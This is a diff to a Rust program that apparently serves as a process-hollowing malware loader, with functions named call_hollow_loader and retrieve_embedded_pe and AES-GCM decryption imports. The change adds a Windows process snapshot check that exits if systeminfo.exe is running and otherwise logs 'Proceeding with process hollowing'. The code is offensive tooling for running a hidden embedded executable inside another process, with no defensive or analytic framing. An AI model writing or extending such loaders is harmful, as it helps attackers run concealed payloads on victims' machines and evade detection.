@@ -5,6 +5,11 @@ use std::io::{Read};
 use log::{debug, error, info, warn};
 use flate2::read::GzDecoder;
 use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit, aead::Aead};
+use windows_sys::Win32::System::Diagnostics::ToolHelp::{
+    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, 
+    TH32CS_SNAPPROCESS, PROCESSENTRY32W
+};
+use windows_sys::Win32::Foundation::CloseHandle;
 
 #[cfg(debug_assertions)]
 fn init_logging() {
@@ -16,10 +21,18 @@ fn init_logging() {
     env_logger::builder().filter_level(log::LevelFilter::Info).init();
 }
 
-
 fn main() {
-    //env_logger::init();
     init_logging();
+
+    // Check if target process is already running
+    let target_process = "systeminfo.exe";
+    info!("Checking if {} is already active...", target_process);
+    if is_target_running(target_process) {
+        warn!("Detected an active instance of {}. Exiting.", target_process);
+        std::process::exit(0);
+    }
+    info!("System clear. Proceeding with process hollowing...");
+
     info!("Start process hollowing");
     call_hollow_loader();
     std::thread::sleep(std::time::Duration::from_millis(10000));
@@ -114,4 +127,41 @@ fn retrieve_embedded_pe() -> Vec<u8> {
             Vec::new()
         }
     }
+}
+
+fn is_target_running(target_name: &str) -> bool {
+    unsafe {
+        // Take a snapshot of all processes in the system
+        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if snapshot == std::ptr::null_mut() {
+            error!("Failed to create process snapshot.");
+            return false;
+        }
+
+        let mut entry: PROCESSENTRY32W = std::mem::zeroed();
+        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
+
+        // Start iterating through the processes
+        if Process32FirstW(snapshot, &mut entry) != 0 {
+            loop {
+                // Convert the UTF-16 EXE name to a Rust String
+                let exe_name = String::from_utf16_lossy(&entry.szExeFile)
+                    .trim_matches(char::from(0)) // Remove null terminators
+                    .to_lowercase();
+                
+                if exe_name == target_name.to_lowercase() {
+                    CloseHandle(snapshot);
+                    return true;
+                }
+
+                // Move to the next process in the snapshot
+                if Process32NextW(snapshot, &mut entry) == 0 {
+                    break;
+                }
+            }
+        }
+
+        CloseHandle(snapshot);
+    }
+    false
 }
